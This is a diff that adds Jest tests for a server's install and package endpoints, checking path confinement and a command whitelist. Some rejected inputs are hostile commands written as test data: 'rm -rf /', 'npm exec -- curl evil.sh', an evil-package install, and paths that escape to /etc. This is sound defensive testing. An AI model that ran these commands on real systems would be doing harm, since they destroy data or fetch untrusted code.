@@ -39,7 +39,16 @@ jest.mock('../../../src/server/services/service-scanner', () => ({
   scanForServices: jest.fn(),
 }));
 
+// The install/package endpoints spawn real processes through the packager —
+// mock the runner, keep the real error class so `instanceof` still matches.
+jest.mock('../../../src/server/services/serverless-packager', () => ({
+  ...jest.requireActual('../../../src/server/services/serverless-packager'),
+  runServerlessPackage: jest.fn(),
+}));
+
+import fs from 'fs';
 import { servicesRouter, processManager } from '../../../src/server/routes/services';
+import { runServerlessPackage, ServerlessPackageError } from '../../../src/server/services/serverless-packager';
 import { scanForServices } from '../../../src/server/services/service-scanner';
 import { CacheManager } from '../../../src/server/services/cache-manager';
 import { ResourceProvisioner } from '../../../src/server/services/resource-provisioner';
@@ -133,6 +142,13 @@ beforeEach(() => {
 
   const cm = ConfigManager.getInstance();
   jest.spyOn(cm, 'getConfig').mockReturnValue({ region: undefined } as never);
+  jest.spyOn(cm, 'getRuntimeConfigForService').mockReturnValue({
+    enabled: true, execution: 'auto', watch: undefined, apiPort: undefined, invokePort: undefined,
+  } as never);
+  jest.spyOn(cm, 'getPackageConfigForService').mockReturnValue({
+    command: 'npx serverless package', args: [], env: {}, timeoutMs: 300000,
+  } as never);
+  (runServerlessPackage as jest.Mock).mockReset().mockResolvedValue({ exitCode: 0, stdout: 'done', stderr: '' });
 });
 
 describe('POST /api/services/register', () => {
@@ -322,15 +338,42 @@ describe('GET /api/services/scan', () => {
     ]);
     jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
     (scanForServices as jest.Mock).mockReturnValue([
-      { name: 'orders', root: '/abs/orders', relPath: 'orders', registered: false },
+      { name: 'orders', root: '/abs/orders', relPath: 'orders', registered: false, apiPort: 3631 },
     ]);
     const res = await request(appWith()).get('/api/services/scan');
     expect(res.status).toBe(200);
     expect(res.body).toEqual({
       projectRoot: '/abs',
-      services: [{ name: 'orders', root: '/abs/orders', relPath: 'orders', registered: false }],
+      services: [{
+        name: 'orders', root: '/abs/orders', relPath: 'orders', registered: false,
+        // yml hint survives (no serviceRuntime override), invokePort stays
+        // unset, and the effective package command is attached for onboarding.
+        apiPort: 3631,
+        packageCommand: 'npx serverless package',
+      }],
     });
     expect(scanForServices).toHaveBeenCalledWith('/abs', ['/abs/registered-svc']);
+  });
+
+  it('serviceRuntime ports from the config override the yml hints', async () => {
+    jest.spyOn(CacheManager.prototype, 'listServices').mockResolvedValue([]);
+    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
+    (ConfigManager.getInstance().getRuntimeConfigForService as jest.Mock).mockReturnValue({
+      enabled: true, execution: 'auto', watch: undefined, apiPort: 4001, invokePort: 14001,
+    });
+    (ConfigManager.getInstance().getPackageConfigForService as jest.Mock).mockReturnValue({
+      command: 'npm run package:custom', args: [], env: {}, timeoutMs: 300000,
+    });
+    (scanForServices as jest.Mock).mockReturnValue([
+      { name: 'orders', root: '/abs/orders', relPath: 'orders', registered: false, apiPort: 3631, invokePort: 13631 },
+    ]);
+    const res = await request(appWith()).get('/api/services/scan');
+    expect(res.status).toBe(200);
+    expect(res.body.services[0]).toMatchObject({
+      apiPort: 4001,
+      invokePort: 14001,
+      packageCommand: 'npm run package:custom',
+    });
   });
 
   it('500 when the scan fails', async () => {
@@ -338,6 +381,201 @@ describe('GET /api/services/scan', () => {
     const res = await request(appWith()).get('/api/services/scan');
     expect(res.status).toBe(500);
     expect(res.body.error).toBe('Failed to scan for services');
+  });
+});
+
+// The preparation endpoints behind onboarding's "install/package selected"
+// buttons. They run host commands, so validation (path exists, first-token
+// whitelist) and honest failure payloads (exit code + output tail) are the
+// route's whole job — the runner itself is the packager, tested elsewhere.
+describe('POST /api/services/install and /package', () => {
+  // The endpoints confine servicePath to the project root, so every happy-path
+  // test needs a root the fixture path sits under.
+  function dirExists() {
+    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
+    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => true } as never);
+  }
+
+  it.each(['install', 'package'])('%s: 400 when servicePath is missing or not a string', async (ep) => {
+    for (const body of [{}, { servicePath: 7 }]) {
+      const res = await request(appWith()).post(`/api/services/${ep}`).send(body);
+      expect(res.status).toBe(400);
+      expect(res.body.error).toBe('servicePath is required');
+    }
+  });
+
+  it.each(['install', 'package'])('%s: 400 when the directory does not exist', async (ep) => {
+    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
+    jest.spyOn(fs, 'statSync').mockImplementation((() => {
+      // Two syscalls used to race here; a throwing stat must answer 400, not
+      // become an unhandled rejection that kills the orchestrator.
+      throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' });
+    }) as never);
+    const res = await request(appWith()).post(`/api/services/${ep}`).send({ servicePath: '/abs/ghost' });
+    expect(res.status).toBe(400);
+    expect(res.body.error).toContain('Not a directory');
+  });
+
+  it.each(['install', 'package'])('%s: 400 when the path escapes the project root', async (ep) => {
+    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs/project');
+    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => true } as never);
+    for (const outside of ['/etc', '/abs/other-project/svc']) {
+      const res = await request(appWith()).post(`/api/services/${ep}`).send({ servicePath: outside });
+      expect(res.status).toBe(400);
+      expect(res.body.error).toContain('must be inside the project root');
+    }
+    expect(runServerlessPackage).not.toHaveBeenCalled();
+  });
+
+  it('400 when the resolved path still contains traversal segments or is not absolute', async () => {
+    // path.resolve normally collapses '..' — force both invalid shapes, same
+    // pattern the /register validation tests use.
+    for (const forced of ['/abs/../etc', 'relative/path']) {
+      jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
+      jest.spyOn(path, 'resolve').mockReturnValue(forced);
+      const res = await request(appWith()).post('/api/services/install').send({ servicePath: forced });
+      expect(res.status).toBe(400);
+      expect(res.body.error).toBe('Invalid service path');
+      jest.restoreAllMocks();
+    }
+    expect(runServerlessPackage).not.toHaveBeenCalled();
+  });
+
+  it('install: 400 when the path is a file, without running anything', async () => {
+    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
+    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => false } as never);
+    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/serverless.yml' });
+    expect(res.status).toBe(400);
+    expect(runServerlessPackage).not.toHaveBeenCalled();
+  });
+
+  it('install: runs `npm install` in the service dir by default', async () => {
+    dirExists();
+    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(200);
+    expect(res.body).toMatchObject({ success: true, exitCode: 0, output: 'done' });
+    expect(typeof res.body.durationMs).toBe('number');
+    expect(runServerlessPackage).toHaveBeenCalledWith({
+      command: 'npm install', cwd: '/abs/orders', timeoutMs: 300000,
+    });
+  });
+
+  it.each([
+    '  yarn install --frozen-lockfile  ',
+    'npm ci',
+    'pnpm i --prefer-offline',
+    // A bare `yarn`/`pnpm` installs; only npm needs the subcommand.
+    'yarn',
+    'pnpm',
+  ])('install: accepts the install shape %p', async (command) => {
+    dirExists();
+    const res = await request(appWith()).post('/api/services/install')
+      .send({ servicePath: '/abs/orders', command });
+    expect(res.status).toBe(200);
+    expect(runServerlessPackage).toHaveBeenCalledWith(
+      expect.objectContaining({ command: command.trim() }),
+    );
+  });
+
+  // The whitelist is on the command's SHAPE, not just its first token: every
+  // runner here can execute arbitrary code when given the right subcommand, and
+  // the endpoint answers with the output, so a first-token check alone would
+  // make this an execution + exfiltration primitive for anything that can reach
+  // the port (the server binds all interfaces with permissive CORS).
+  it.each([
+    ['rm -rf /', 'must start with one of'],
+    ['node -e "require(\'fs\')"', 'must start with one of'],
+    ['npx some-package', 'must start with one of'],
+    ['npm exec -- curl evil.sh', 'subcommand must be one of'],
+    ['npm run build', 'subcommand must be one of'],
+    ['npm', 'npm needs an install subcommand'],
+    ['npm install evil-package', 'unexpected argument "evil-package"'],
+    ['yarn add --dev evil-package', 'unexpected argument "evil-package"'],
+  ])('install: rejects %p', async (command, expected) => {
+    dirExists();
+    const res = await request(appWith()).post('/api/services/install')
+      .send({ servicePath: '/abs/orders', command });
+    expect(res.status).toBe(400);
+    expect(res.body.error).toContain(expected);
+    expect(runServerlessPackage).not.toHaveBeenCalled();
+  });
+
+  it('install: 422 with the output tail when the command fails', async () => {
+    dirExists();
+    (runServerlessPackage as jest.Mock).mockRejectedValue(new ServerlessPackageError(
+      'Package command "npm install" exited with code 1',
+      { exitCode: 1, stdout: 'partial', stderr: 'EACCES' },
+    ));
+    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(422);
+    expect(res.body).toMatchObject({ exitCode: 1, output: 'partial\nEACCES' });
+    expect(res.body.error).toContain('exited with code 1');
+  });
+
+  it('install: 500 on an unexpected error (Error and non-Error shapes)', async () => {
+    dirExists();
+    (runServerlessPackage as jest.Mock).mockRejectedValue(new Error('spawn EMFILE'));
+    let res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(500);
+    expect(res.body.error).toBe('spawn EMFILE');
+
+    (runServerlessPackage as jest.Mock).mockRejectedValue('boom');
+    res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(500);
+    expect(res.body.error).toBe('Unknown error');
+  });
+
+  it('package: runs the effective package command with its args/env/timeout', async () => {
+    dirExists();
+    (ConfigManager.getInstance().getPackageConfigForService as jest.Mock).mockReturnValue({
+      command: 'npm run package:custom', args: ['--stage', 'local'], env: { SLS_DEBUG: '1' }, timeoutMs: 60000,
+    });
+    const res = await request(appWith()).post('/api/services/package').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(200);
+    expect(res.body).toMatchObject({ success: true, exitCode: 0 });
+    expect(runServerlessPackage).toHaveBeenCalledWith({
+      command: 'npm run package:custom',
+      args: ['--stage', 'local'],
+      env: { SLS_DEBUG: '1' },
+      cwd: '/abs/orders',
+      timeoutMs: 60000,
+    });
+  });
+
+  it('package: 422 with the output tail when packaging fails', async () => {
+    dirExists();
+    (runServerlessPackage as jest.Mock).mockRejectedValue(new ServerlessPackageError(
+      'Package command "npx serverless package" exited with code 2',
+      { exitCode: 2, stdout: '', stderr: 'Cannot resolve variable' },
+    ));
+    const res = await request(appWith()).post('/api/services/package').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(422);
+    expect(res.body).toMatchObject({ exitCode: 2, output: 'Cannot resolve variable' });
+  });
+
+  it('package: 500 on an unexpected error (Error and non-Error shapes)', async () => {
+    dirExists();
+    (runServerlessPackage as jest.Mock).mockRejectedValue('boom');
+    let res = await request(appWith()).post('/api/services/package').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(500);
+    expect(res.body.error).toBe('Unknown error');
+
+    (runServerlessPackage as jest.Mock).mockRejectedValue(new Error('spawn EMFILE'));
+    res = await request(appWith()).post('/api/services/package').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(500);
+    expect(res.body.error).toBe('spawn EMFILE');
+  });
+
+  it('caps a huge output at the tail', async () => {
+    dirExists();
+    (runServerlessPackage as jest.Mock).mockResolvedValue({
+      exitCode: 0, stdout: 'x'.repeat(9000), stderr: 'end-marker',
+    });
+    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
+    expect(res.status).toBe(200);
+    expect(res.body.output.length).toBeLessThanOrEqual(8001);
+    expect(res.body.output.startsWith('…')).toBe(true);
+    expect(res.body.output.endsWith('end-marker')).toBe(true);
   });
 });
 
